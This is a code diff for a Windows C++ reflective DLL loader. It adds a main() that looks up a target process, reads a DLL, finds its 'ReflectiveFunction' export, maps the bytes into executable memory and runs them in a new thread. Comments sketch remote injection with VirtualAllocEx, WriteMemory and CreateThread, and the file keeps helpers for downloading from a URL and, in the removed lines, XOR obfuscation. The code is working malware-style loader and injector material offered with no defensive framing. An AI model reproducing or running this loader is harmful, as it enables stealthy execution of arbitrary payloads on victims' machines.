@@ -1,12 +1,20 @@
-#include "utils.h"
-#include <iostream>
+﻿#define WIN32_LEAN_AND_MEAN
+#include <Windows.h>
 #include <urlmon.h>
 #include <wininet.h>
-#include <fstream>
-#include <filesystem>
 #include <TlHelp32.h>
 
-std::vector<char> download_from_url(_in_ const char* url) 
+#include <iostream>
+#include <vector>
+#include <fstream>
+#include <filesystem>
+
+#include "pe_parser.h"
+
+#define _in_ 
+#define _out_
+
+std::vector<char> download_from_url(_in_ const char* url)
 {
     std::vector<char> buffer;
     IStream* stream = nullptr;
@@ -46,7 +54,7 @@ std::vector<char> download_from_url(_in_ const char* url)
         stream->Release();
 
         if (!buffer.empty()) {
-            std::cout << "[+] Download completed, size: " << buffer.size() << " �ֽ�" << std::endl;
+            std::cout << "[+] Download completed, size: " << buffer.size() << " 字节" << std::endl;
         }
         else {
             std::cout << "[-] Download completed, but the data is empty" << std::endl;
@@ -112,20 +120,6 @@ std::vector<char> load_local_file(_in_ const std::string& file_path)
     return buffer;
 }
 
-static void ob_xor(byte_t* begin, const size_t size, const byte_t* key, const size_t key_size) 
-{
-    for (size_t i = 0; i < size; i++)
-    {
-        begin[i] = begin[i] ^ key[i % key_size];
-    }
-}
-
-void encrypt_data(byte_t* begin, size_t size)
-{
-
-    ob_xor(begin, size, Key::OB_XOR_KEY, Key::OB_XOR_KEY_SIZE);
-
-}
 
 static void to_tower_case_wide(wchar_t str[])
 {
@@ -198,4 +192,66 @@ int ret_pid_by_proc_name(wchar_t* proc_name)
 
     CloseHandle(proc_snap);
     return 0;
+}
+
+
+
+
+
+
+int main(int ac, char* av[], char* env[])
+{
+    int local = 1;
+
+	// 搜索进程
+    wchar_t* proc_name = get_wc(av[2]);
+    int pid = ret_pid_by_proc_name(proc_name);
+    delete[] proc_name;
+    if (pid == 0)
+        return -1;
+
+	// 下载DLL
+    std::vector dll_bytes = load_local_file(av[1]);
+    if (dll_bytes.empty())
+        return -1;
+
+    // 解析DLL
+    pe_parser pe;
+    pe.initialize(dll_bytes.data(), dll_bytes.size());
+	// Find YOLO
+    DWORD func_size = pe.get_func_size("yolo");
+    uintptr_t func_raw = pe.get_func_raw("yolo");
+
+	// VirtualAllocEX
+	// WriteMemory
+	// CreateThread
+
+    if (local == 1)
+    {
+        uintptr_t dll_ptr = (uintptr_t)VirtualAlloc(0, dll_bytes.size(), MEM_COMMIT, PAGE_READWRITE);
+        if (dll_ptr == 0)
+            return -1;
+
+        memcpy((void*)dll_ptr, dll_bytes.data(), dll_bytes.size());
+
+        DWORD oldprotect = 0;
+        if (!VirtualProtect((VOID*)dll_ptr, dll_bytes.size(), PAGE_EXECUTE_READ, &oldprotect))
+            return -1;
+
+        uintptr_t rf_raw = pe.get_func_raw("ReflectiveFunction");
+
+        DWORD thread_id = 0;
+        HANDLE thread = 0;
+
+        thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)(pe.get_base() + rf_raw), 0, CREATE_SUSPENDED, &thread_id);
+        ResumeThread(thread);
+        WaitForSingleObject(thread, INFINITE);
+        getchar();
+        return 0;
+    }
+
+
+
+
+	return -1;
 }
